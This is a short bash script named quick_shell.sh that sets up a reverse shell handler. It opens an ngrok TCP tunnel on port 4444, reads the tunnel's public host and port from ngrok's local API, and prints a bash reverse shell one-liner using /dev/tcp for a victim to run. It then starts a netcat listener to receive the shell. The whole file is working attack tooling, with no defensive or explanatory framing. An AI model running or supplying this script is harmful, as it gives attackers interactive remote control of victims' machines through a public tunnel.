#!/bin/bash
# quick_shell.sh

echo "[+] Setting up ngrok..."
ngrok tcp 4444 --log=stdout > /dev/null 2>&1 &
sleep 5

HOST=$(curl -s http://localhost:4040/api/tunnels | grep -o 'tcp://[^"]*' | sed 's/tcp:\/\///' | cut -d':' -f1)
PORT=$(curl -s http://localhost:4040/api/tunnels | grep -o 'tcp://[^"]*' | sed 's/tcp:\/\///' | cut -d':' -f2)

echo "[+] Copy this bash reverse shell:"
echo "bash -c 'bash -i >& /dev/tcp/$HOST/$PORT 0>&1'"
echo ""
echo "[+] Starting listener..."
nc -lvnp 4444
